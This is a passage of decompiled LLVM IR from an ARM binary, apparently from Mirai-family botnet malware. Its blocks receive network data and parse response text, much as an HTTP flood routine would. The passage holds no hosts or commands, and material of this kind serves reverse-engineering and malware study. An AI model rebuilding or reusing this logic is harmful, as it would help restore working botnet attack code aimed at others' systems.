dec_label_pc_9898:                                ; preds = %.thread38, %dec_label_pc_9864
  %v0_9d74 = phi i32 [ %v4_985c, %.thread38 ], [ %v2_9890, %dec_label_pc_9864 ]
  %v0_9898 = load i32, i32* @r5, align 4
  %v2_9898 = add i32 %v0_9898, %v0_9d74
  %v3_9898 = inttoptr i32 %v2_9898 to i8*
  %v4_9898 = load i8, i8* %v3_9898, align 1
  %v6_9898 = zext i8 %v4_9898 to i32
  store i32 %v6_9898, i32* %r3.global-to-local, align 4
  %v2_989c = icmp ugt i8 %v4_9898, 33
  store i1 %v2_989c, i1* %cpsr_c.global-to-local, align 1
  %v7_989c = icmp eq i8 %v4_9898, 34
  store i1 %v7_989c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_989c, label %dec_label_pc_9d74, label %dec_label_pc_98a4

dec_label_pc_98a4:                                ; preds = %dec_label_pc_9d74, %dec_label_pc_9898, %dec_label_pc_9d9c
  %v0_98a4 = load i32, i32* @r5, align 4
  store i32 %v0_98a4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_98ac = inttoptr i32 %v0_98a4 to i8*
  %v3_98ac = call i32 @util_atoi(i8* %v2_98ac, i32 10)
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = add i32 %v3_98ac, -1
  store i32 %v1_98b0, i32* %r3.global-to-local, align 4
  %v2_98b4 = icmp ugt i32 %v1_98b0, 7
  store i1 %v2_98b4, i1* %cpsr_c.global-to-local, align 1
  %v7_98b4 = icmp eq i32 %v1_98b0, 8
  store i1 %v7_98b4, i1* %cpsr_z.global-to-local, align 1
  %v2_98b8 = xor i1 %v2_98b4, true
  %v3_98b8 = or i1 %v7_98b4, %v2_98b8
  br i1 %v3_98b8, label %dec_label_pc_98cc.preheader, label %dec_label_pc_98e0

dec_label_pc_98cc.preheader:                      ; preds = %dec_label_pc_98a4
  store i32 %v2_879c, i32* %r2.global-to-local, align 4
  %v6_98bc = add i32 %v3_98ac, %v2_879c
  store i32 %v6_98bc, i32* @r4, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98cc
  %v1_98c8 = call i32 @sleep(i32 1)
  store i32 %v1_98c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98cc.preheader, %dec_label_pc_98c8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @__GI_time(i32* null)
  %v0_98d4 = load i32, i32* @r4, align 4
  %v3_98d4 = icmp uge i32 %v0_98d4, %v2_98d0
  store i1 %v3_98d4, i1* %cpsr_c.global-to-local, align 1
  %v9_98d4 = icmp eq i32 %v0_98d4, %v2_98d0
  store i1 %v9_98d4, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_98dc = xor i1 %v9_98d4, true
  %v3_98dc = and i1 %v3_98d4, %v2_98dc
  br i1 %v3_98dc, label %dec_label_pc_98c8, label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %dec_label_pc_98cc, %dec_label_pc_98a4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_98e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98e4, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  %v2_98e8 = add i32 %v0_98e8, %v3_98e4
  store i32 %v2_98e8, i32* @r6, align 4
  store i32 %v2_98e8, i32* %r0.global-to-local, align 4
  %v1_98f0 = inttoptr i32 %v2_98e8 to i8*
  %v2_98f0 = call i32 @util_strlen(i8* %v1_98f0)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7ac.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98f0, i32* @r1, align 4
  %v0_98fc = load i32, i32* @r6, align 4
  store i32 %v0_98fc, i32* %r0.global-to-local, align 4
  %v4_9900 = inttoptr i32 %v0_98fc to i8*
  %v5_9900 = call i32 @util_stristr(i8* %v4_9900, i32 %v2_98f0, i32 ptrtoint ([5 x i8]* @global_var_1a7ac.53 to i32))
  store i32 %v5_9900, i32* %r0.global-to-local, align 4
  %v2_9904 = icmp ugt i32 %v5_9900, 3
  store i1 %v2_9904, i1* %cpsr_c.global-to-local, align 1
  %v7_9904 = icmp eq i32 %v5_9900, 4
  store i1 %v7_9904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9904, label %dec_label_pc_9c60, label %dec_label_pc_990c

dec_label_pc_990c:                                ; preds = %dec_label_pc_98e0
  %v0_990c = load i32, i32* @r5, align 4
  %v1_990c = load i32, i32* @r4, align 4
  %v2_990c = add i32 %v1_990c, %v0_990c
  %v3_990c = inttoptr i32 %v2_990c to i8*
  %v4_990c = load i8, i8* %v3_990c, align 1
  %v6_990c = zext i8 %v4_990c to i32
  store i32 %v6_990c, i32* @r3, align 4
  %v2_9910 = icmp ugt i8 %v4_990c, 46
  store i1 %v2_9910, i1* %cpsr_c.global-to-local, align 1
  %v7_9910 = icmp eq i8 %v4_990c, 47
  store i1 %v7_9910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9910, label %dec_label_pc_9dbc, label %dec_label_pc_9918

dec_label_pc_9918:                                ; preds = %dec_label_pc_9dd8, %dec_label_pc_9dbc, %dec_label_pc_9d24, %dec_label_pc_9d08, %dec_label_pc_990c, %dec_label_pc_9e04, %dec_label_pc_9d50
  %v0_9918 = load i32, i32* %sb.global-to-local, align 4
  %v1_991c = add i32 %v0_9918, 1431
  store i32 %v1_991c, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a788.29 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_9928 = call i32 @memcpy()
  store i32 %v0_9928, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_9930 = load i32, i32* @sl, align 4
  %v3_9930 = add i32 %v2_9930, -1448
  %v4_9930 = inttoptr i32 %v3_9930 to i8*
  store i8 10, i8* %v4_9930, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9938:                                ; preds = %dec_label_pc_9804, %dec_label_pc_9744, %dec_label_pc_9718
  %v0_9938 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9938, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9948 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9938, i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), i32 4)
  %v0_994c = load i32, i32* %sb.global-to-local, align 4
  %v1_9950 = add i32 %v0_994c, 1431
  store i32 %v1_9950, i32* @r4, align 4
  store i32 %v5_9948, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7bc.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9950, i32* %r0.global-to-local, align 4
  %v3_9960 = inttoptr i32 %v1_9950 to i8*
  %v4_9960 = call i32 @util_strcmp(i8* %v3_9960, i32 ptrtoint ([5 x i8]* @global_var_1a7bc.57 to i32))
  store i32 %v4_9960, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9964 = icmp eq i32 %v4_9960, 0
  store i1 %v2_9964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9964, label %dec_label_pc_9b14, label %dec_label_pc_996c

dec_label_pc_996c:                                ; preds = %dec_label_pc_9b14, %dec_label_pc_9938
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9970 = load i32, i32* @sl, align 4
  %v3_9970 = add i32 %v2_9970, -1448
  %v4_9970 = inttoptr i32 %v3_9970 to i8*
  store i8 7, i8* %v4_9970, align 1
  br label %dec_label_pc_9974

dec_label_pc_9974:                                ; preds = %bb211, %dec_label_pc_996c
  %v0_9974 = load i32, i32* @r5, align 4
  store i32 %v0_9974, i32* %r2.global-to-local, align 4
  %v0_9978 = load i32, i32* @sl, align 4
  %v1_9978 = add i32 %v0_9978, -1452
  %v2_9978 = inttoptr i32 %v1_9978 to i32*
  %v3_9978 = load i32, i32* %v2_9978, align 4
  store i32 %v3_9978, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9984 = call i32 @__libc_recv(i32 %v3_9978, i32 %v2_827c, i32 %v0_9974, i32 16384)
  store i32 %v4_9984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87ec

dec_label_pc_998c:                                ; preds = %dec_label_pc_8e94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v0_9994 = load i32, i32* @sl, align 4
  %v1_9994 = add i32 %v0_9994, 660
  %v2_9994 = inttoptr i32 %v1_9994 to i32*
  %v3_9994 = load i32, i32* %v2_9994, align 4
  store i32 %v3_9994, i32* @r4, align 4
  %v3_9998 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_999c = load i32, i32* @r4, align 4
  store i32 %v0_999c, i32* %r1.global-to-local, align 4
  store i32 %v3_9998, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_99a8 = load i32, i32* @r7, align 4
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v4_99ac = call i32 @util_memsearch(i32 %v0_99a8, i32 %v0_999c, i32 %v3_9998, i32 11)
  store i32 %v4_99ac, i32* %r0.global-to-local, align 4
  %v0_99b0 = load i32, i32* @sl, align 4
  %v1_99b0 = add i32 %v0_99b0, 660
  %v2_99b0 = inttoptr i32 %v1_99b0 to i32*
  %v3_99b0 = load i32, i32* %v2_99b0, align 4
  %v0_99b4 = load i32, i32* @r7, align 4
  %v2_99b4 = add i32 %v0_99b4, %v4_99ac
  store i32 %v2_99b4, i32* @r6, align 4
  store i32 %v4_99ac, i32* @r4, align 4
  %v2_99bc = sub i32 %v3_99b0, %v4_99ac
  store i32 %v2_99bc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7c4.59 to i32), i32* %r2.global-to-local, align 4
  %v0_99c4 = load i32, i32* @r8, align 4
  store i32 %v0_99c4, i32* %r3.global-to-local, align 4
  store i32 %v2_99b4, i32* %r0.global-to-local, align 4
  %v4_99cc = call i32 @util_memsearch(i32 %v2_99b4, i32 %v2_99bc, i32 ptrtoint (i32* @global_var_1a7c4.59 to i32), i32 %v0_99c4)
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  %v0_99d0 = load i32, i32* @sl, align 4
  %v1_99d0 = add i32 %v0_99d0, 16
  %v2_99d0 = inttoptr i32 %v1_99d0 to i32*
  %v3_99d0 = load i32, i32* %v2_99d0, align 4
  store i32 %v3_99d0, i32* %r3.global-to-local, align 4
  %v1_99d4 = load i32, i32* @r4, align 4
  %v2_99d4 = add i32 %v1_99d4, %v4_99cc
  store i32 %v2_99d4, i32* @r5, align 4
  %v0_99d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_99d8 = add i32 %v0_99d8, %v2_99d4
  store i32 %v2_99d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_99e0 = icmp ugt i32 %v3_99d0, 3
  store i1 %v2_99e0, i1* %cpsr_c.global-to-local, align 1
  %v7_99e0 = icmp eq i32 %v3_99d0, 4
  store i1 %v7_99e0, i1* %cpsr_z.global-to-local, align 1
  %v3_99e4 = add i32 %v2_99d8, 2115
  %v4_99e4 = inttoptr i32 %v3_99e4 to i8*
  store i8 0, i8* %v4_99e4, align 1
  %v7_99e8 = icmp sgt i32 %v3_99d0, 4
  br i1 %v7_99e8, label %dec_label_pc_99ec, label %dec_label_pc_9b54

dec_label_pc_99ec:                                ; preds = %dec_label_pc_998c, %dec_label_pc_9b54, %dec_label_pc_9b64
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_99f4 = load i32, i32* @sl, align 4
  %v2_99f4 = add i32 %v1_99f4, 12
  %v3_99f4 = inttoptr i32 %v2_99f4 to i32*
  store i32 -1, i32* %v3_99f4, align 4
  %v0_99f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_99f8 = trunc i32 %v0_99f8 to i8
  %v2_99f8 = load i32, i32* @sl, align 4
  %v3_99f8 = add i32 %v2_99f8, -1448
  %v4_99f8 = inttoptr i32 %v3_99f8 to i8*
  store i8 %v1_99f8, i8* %v4_99f8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9a00:                                ; preds = %bb201
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9a0c = load i32, i32* @r6, align 4
  %v1_9a0c = add i32 %v0_9a0c, 4
  %v2_9a0c = inttoptr i32 %v1_9a0c to i8*
  %v3_9a0c = load i8, i8* %v2_9a0c, align 1
  %v4_9a0c = zext i8 %v3_9a0c to i32
  store i32 %v4_9a0c, i32* @r3, align 4
  %v2_9a10 = icmp ugt i8 %v3_9a0c, 114
  store i1 %v2_9a10, i1* %cpsr_c.global-to-local, align 1
  %v7_9a10 = icmp eq i8 %v3_9a0c, 115
  store i1 %v7_9a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a10, label %bb206, label %.thread41

bb206:                                            ; preds = %dec_label_pc_9a00
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_9a00, %bb206
  %v3_9a20 = phi i32 [ 7, %dec_label_pc_9a00 ], [ 8, %bb206 ]
  store i32 %v0_9a0c, i32* @r0, align 4
  %v1_9a28 = load i32, i32* @r5, align 4
  %v2_9a28 = sub i32 %v1_9a28, %v3_9a20
  store i32 %v2_9a28, i32* @r2, align 4
  %v2_9a2c = add i32 %v3_9a20, %v0_9a0c
  store i32 %v2_9a2c, i32* @r1, align 4
  %v3_9a30 = call i32 @memmove(i32 %v0_9a0c, i32 %v2_9a2c, i32 %v2_9a28)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v0_9a38 = load i32, i32* @r7, align 4
  store i32 %v0_9a38, i32* %stack_var_-44, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_9a40 = load i32, i32* @r4, align 4
  %v2_9a40 = add i32 %v1_9a40, %v2_827c
  %v3_9a40 = inttoptr i32 %v2_9a40 to i8*
  %v4_9a40 = load i8, i8* %v3_9a40, align 1
  %v6_9a40 = zext i8 %v4_9a40 to i32
  store i32 %v6_9a40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a44 = icmp eq i8 %v4_9a40, 0
  store i1 %v2_9a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a44, label %dec_label_pc_9a88, label %dec_label_pc_9a4c

dec_label_pc_9a4c:                                ; preds = %.thread41
  %v2_9a4c = icmp ugt i8 %v4_9a40, 46
  store i1 %v2_9a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_9a4c = icmp eq i8 %v4_9a40, 47
  store i1 %v7_9a4c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a50 = load i32, i32* @r6, align 4
  br i1 %v7_9a4c, label %bb207, label %dec_label_pc_9a58

bb207:                                            ; preds = %dec_label_pc_9a4c
  store i32 %v1_9a50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a4c
  store i32 %v0_9a38, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9a68

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a68
  %v2_9a60 = icmp ugt i8 %v4_9a74, 46
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v7_9a60 = icmp eq i8 %v4_9a74, 47
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a60, label %dec_label_pc_9b48, label %dec_label_pc_9a68

dec_label_pc_9a68:                                ; preds = %dec_label_pc_9a60, %dec_label_pc_9a58
  %v0_9a68 = phi i32 [ %v1_9a68, %dec_label_pc_9a60 ], [ %v0_9a38, %dec_label_pc_9a58 ]
  %v1_9a68 = add i32 %v0_9a68, 1
  store i32 %v1_9a68, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_9a68, i32* %stack_var_-44, align 4
  %v2_9a74 = add i32 %v1_9a68, %v1_9a50
  %v3_9a74 = inttoptr i32 %v2_9a74 to i8*
  %v4_9a74 = load i8, i8* %v3_9a74, align 1
  %v6_9a74 = zext i8 %v4_9a74 to i32
  store i32 %v6_9a74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a78 = icmp eq i8 %v4_9a74, 0
  store i1 %v2_9a78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9a68, i32* %r1.global-to-local, align 4
  store i32 %v2_9a74, i32* %r2.global-to-local, align 4
  br i1 %v2_9a78, label %dec_label_pc_9a88, label %dec_label_pc_9a60

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9a68, %.thread41, %dec_label_pc_9b48
  %v0_9a88 = load i32, i32* @r6, align 4
  store i32 %v0_9a88, i32* %r0.global-to-local, align 4
  %v1_9a8c = inttoptr i32 %v0_9a88 to i8*
  %v2_9a8c = call i32 @util_strlen(i8* %v1_9a8c)
  store i32 %v2_9a8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a90 = icmp eq i32 %v2_9a8c, 0
  store i1 %v2_9a90, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v2_9a8c, 1
  br i1 %tmp208, label %dec_label_pc_9ab4, label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a88
  %v0_9a98 = load i32, i32* @r6, align 4
  store i32 %v0_9a98, i32* %r0.global-to-local, align 4
  %v1_9a9c = inttoptr i32 %v0_9a98 to i8*
  %v2_9a9c = call i32 @util_strlen(i8* %v1_9a9c)
  store i32 %v2_9a9c, i32* %r0.global-to-local, align 4
  %v1_9aa0 = add i32 %v2_9a9c, -127
  %v2_9aa0 = icmp ugt i32 %v2_9a9c, 126
  store i1 %v2_9aa0, i1* %cpsr_c.global-to-local, align 1
  %v3_9aa0 = sub i32 126, %v2_9a9c
  %v4_9aa0 = and i32 %v3_9aa0, %v2_9a9c
  %v5_9aa0 = icmp slt i32 %v4_9aa0, 0
  %v6_9aa0 = icmp slt i32 %v1_9aa0, 0
  %v7_9aa0 = icmp eq i32 %v2_9a9c, 127
  store i1 %v7_9aa0, i1* %cpsr_z.global-to-local, align 1
  %v7_9aa4 = icmp sgt i32 %v2_9a9c, 127
  br i1 %v7_9aa4, label %.thread44, label %bb209

bb209:                                            ; preds = %dec_label_pc_9a98
  %v8_9aa4 = load i32, i32* %sb.global-to-local, align 4
  %v9_9aa8 = add i32 %v8_9aa4, 789
  store i32 %v9_9aa8, i32* %r0.global-to-local, align 4
  %v8_9aac = load i32, i32* @r6, align 4
  store i32 %v8_9aac, i32* %r1.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9a98, %bb209
  store i32 39604, i32* @lr, align 4
  %v3_9ab0 = xor i1 %v6_9aa0, %v5_9aa0
  %v4_9ab0 = or i1 %v7_9aa0, %v3_9ab0
  call void @__pseudo_cond_branch(i1 %v4_9ab0, i32 ptrtoint (i32* @global_var_118dc.60 to i32))
  br label %dec_label_pc_9ab4

dec_label_pc_9ab4:                                ; preds = %dec_label_pc_9a88, %.thread44
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9ab8 = load i32, i32* %stack_var_-44, align 4
  %v0_9abc = load i32, i32* @r6, align 4
  %v1_9abc = add i32 %v0_9abc, 1
  store i32 %v1_9abc, i32* @r5, align 4
  %v2_9ac0 = add i32 %v1_9abc, %v3_9ab8
  store i32 %v2_9ac0, i32* %r0.global-to-local, align 4
  %v1_9ac4 = inttoptr i32 %v2_9ac0 to i8*
  %v2_9ac4 = call i32 @util_strlen(i8* %v1_9ac4)
  store i32 %v2_9ac4, i32* %r0.global-to-local, align 4
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 254
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 255
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v8_9acc = icmp sgt i32 %v2_9ac4, 255
  br i1 %v8_9acc, label %dec_label_pc_9654, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ab4
  %v0_9ad0 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ad4 = add i32 %v0_9ad0, 533
  store i32 %v1_9ad4, i32* @r4, align 4
  store i32 %v1_9ad4, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9ae0 = call i32 @util_zero(i32 %v1_9ad4, i32 255)
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9ae8 = load i32, i32* %stack_var_-44, align 4
  %v0_9aec = load i32, i32* @r5, align 4
  %v2_9aec = add i32 %v0_9aec, %v3_9ae8
  store i32 %v2_9aec, i32* %r0.global-to-local, align 4
  %v1_9af0 = inttoptr i32 %v2_9aec to i8*
  %v2_9af0 = call i32 @util_strlen(i8* %v1_9af0)
  store i32 %v2_9af0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9af4 = icmp eq i32 %v2_9af0, 0
  store i1 %v2_9af4, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_9af0, 1
  br i1 %tmp210, label %dec_label_pc_9654, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9ad0
  %v3_9b00 = load i32, i32* %stack_var_-44, align 4
  %v0_9b04 = load i32, i32* @r4, align 4
  store i32 %v0_9b04, i32* @r0, align 4
  %v0_9b08 = load i32, i32* @r5, align 4
  %v2_9b08 = add i32 %v0_9b08, %v3_9b00
  store i32 %v2_9b08, i32* %r1.global-to-local, align 4
  %v2_9b0c = inttoptr i32 %v0_9b04 to i8*
  %v3_9b0c = call i32 @util_strcpy(i8* %v2_9b0c, i32 %v2_9b08)
  store i32 %v3_9b0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9938
  %v0_9b14 = load i32, i32* @r4, align 4
  store i32 %v0_9b14, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a788.29 to i32), i32* %r1.global-to-local, align 4
  %v3_9b1c = inttoptr i32 %v0_9b14 to i8*
  %v4_9b1c = call i32 @util_strcmp(i8* %v3_9b1c, i32 ptrtoint ([4 x i8]* @global_var_1a788.29 to i32))
  store i32 %v4_9b1c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b20 = icmp eq i32 %v4_9b1c, 0
  store i1 %v2_9b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b20, label %bb211, label %dec_label_pc_996c

bb211:                                            ; preds = %dec_label_pc_9b14
  %v0_9b28 = load i32, i32* %fp.global-to-local, align 4
  %v1_9b28 = load i32, i32* @r5, align 4
  %v3_9b28 = icmp uge i32 %v0_9b28, %v1_9b28
  store i1 %v3_9b28, i1* %cpsr_c.global-to-local, align 1
  %v9_9b28 = icmp eq i32 %v0_9b28, %v1_9b28
  store i1 %v9_9b28, i1* %cpsr_z.global-to-local, align 1
  %v7_9b2c = icmp sgt i32 %v0_9b28, %v1_9b28
  %. = select i1 %v7_9b2c, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9b34 = trunc i32 %. to i8
  %v10_9b34 = load i32, i32* @sl, align 4
  %v11_9b34 = add i32 %v10_9b34, -1448
  %v12_9b34 = inttoptr i32 %v11_9b34 to i8*
  store i8 %v9_9b34, i8* %v12_9b34, align 1
  br label %dec_label_pc_9974

dec_label_pc_9b40:                                ; preds = %dec_label_pc_8f38
  %v0_9b40 = load i32, i32* @r4, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @sl, align 4
  %v3_9b40 = add i32 %v2_9b40, -1448
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9a60, %bb207
  %v2_9b4c = phi i32 [ %v1_9a50, %bb207 ], [ %v2_9a74, %dec_label_pc_9a60 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_9a88

dec_label_pc_9b54:                                ; preds = %dec_label_pc_998c
  %v0_9b54 = load i32, i32* @r6, align 4
  store i32 %v0_9b54, i32* %r0.global-to-local, align 4
  %v1_9b58 = inttoptr i32 %v0_9b54 to i8*
  %v2_9b58 = call i32 @util_strlen(i8* %v1_9b58)
  store i32 %v2_9b58, i32* %r0.global-to-local, align 4
  %v2_9b5c = icmp ugt i32 %v2_9b58, 126
  store i1 %v2_9b5c, i1* %cpsr_c.global-to-local, align 1
  %v7_9b5c = icmp eq i32 %v2_9b58, 127
  store i1 %v7_9b5c, i1* %cpsr_z.global-to-local, align 1
  %v8_9b60 = icmp sgt i32 %v2_9b58, 127
  br i1 %v8_9b60, label %dec_label_pc_99ec, label %dec_label_pc_9b64

dec_label_pc_9b64:                                ; preds = %dec_label_pc_9b54
  %v0_9b64 = load i32, i32* @sl, align 4
  %v1_9b64 = add i32 %v0_9b64, 16
  %v2_9b64 = inttoptr i32 %v1_9b64 to i32*
  %v3_9b64 = load i32, i32* %v2_9b64, align 4
  %v1_9b68 = and i32 %v3_9b64, 33554432
  %v2_9b68 = icmp ne i32 %v1_9b68, 0
  store i1 %v2_9b68, i1* %cpsr_c.global-to-local, align 1
  %v3_9b68 = mul i32 %v3_9b64, 128
  %v1_9b6c = add i32 %v3_9b68, 1472
  %v0_9b70 = load i32, i32* @r6, align 4
  store i32 %v0_9b70, i32* %r1.global-to-local, align 4
  %v0_9b74 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b74 = add i32 %v1_9b6c, %v0_9b74
  store i32 %v2_9b74, i32* @r0, align 4
  %v2_9b78 = inttoptr i32 %v2_9b74 to i8*
  %v3_9b78 = call i32 @util_strcpy(i8* %v2_9b78, i32 %v0_9b70)
  store i32 %v3_9b78, i32* %r0.global-to-local, align 4
  %v0_9b7c = load i32, i32* @sl, align 4
  %v1_9b7c = add i32 %v0_9b7c, 16
  %v2_9b7c = inttoptr i32 %v1_9b7c to i32*
  %v3_9b7c = load i32, i32* %v2_9b7c, align 4
  %v1_9b80 = and i32 %v3_9b7c, 33554432
  %v2_9b80 = icmp ne i32 %v1_9b80, 0
  store i1 %v2_9b80, i1* %cpsr_c.global-to-local, align 1
  %v3_9b80 = mul i32 %v3_9b7c, 128
  %v1_9b84 = add i32 %v3_9b80, 1472
  %v0_9b88 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b88 = add i32 %v1_9b84, %v0_9b88
  store i32 %v2_9b88, i32* @r4, align 4
  store i32 %v2_9b88, i32* %r0.global-to-local, align 4
  %v1_9b90 = inttoptr i32 %v2_9b88 to i8*
  %v2_9b90 = call i32 @util_strlen(i8* %v1_9b90)
  store i32 ptrtoint (i32* @global_var_1aab8.62 to i32), i32* %r1.global-to-local, align 4
  %v0_9b98 = load i32, i32* @r4, align 4
  %v2_9b98 = add i32 %v0_9b98, %v2_9b90
  store i32 %v2_9b98, i32* @r0, align 4
  %v2_9b9c = inttoptr i32 %v2_9b98 to i8*
  %v3_9b9c = call i32 @util_strcpy(i8* %v2_9b9c, i32 ptrtoint (i32* @global_var_1aab8.62 to i32))
  store i32 %v3_9b9c, i32* %r0.global-to-local, align 4
  %v0_9ba0 = load i32, i32* @r5, align 4
  %v1_9ba0 = add i32 %v0_9ba0, 3
  store i32 %v1_9ba0, i32* @r5, align 4
  %v0_9ba4 = load i32, i32* @sl, align 4
  %v1_9ba4 = add i32 %v0_9ba4, 660
  %v2_9ba4 = inttoptr i32 %v1_9ba4 to i32*
  %v3_9ba4 = load i32, i32* %v2_9ba4, align 4
  %v0_9ba8 = load i32, i32* @r7, align 4
  %v2_9ba8 = add i32 %v0_9ba8, %v1_9ba0
  store i32 %v2_9ba8, i32* @r6, align 4
  %v2_9bac = sub i32 %v3_9ba4, %v1_9ba0
  store i32 %v2_9bac, i32* %r1.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @r8, align 4
  store i32 %v0_9bb0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7c4.59 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9ba8, i32* %r0.global-to-local, align 4
  %v4_9bbc = call i32 @util_memsearch(i32 %v2_9ba8, i32 %v2_9bac, i32 ptrtoint (i32* @global_var_1a7c4.59 to i32), i32 %v0_9bb0)
  store i32 %v4_9bbc, i32* %r0.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @sl, align 4
  %v1_9bc0 = add i32 %v0_9bc0, 16
  %v2_9bc0 = inttoptr i32 %v1_9bc0 to i32*
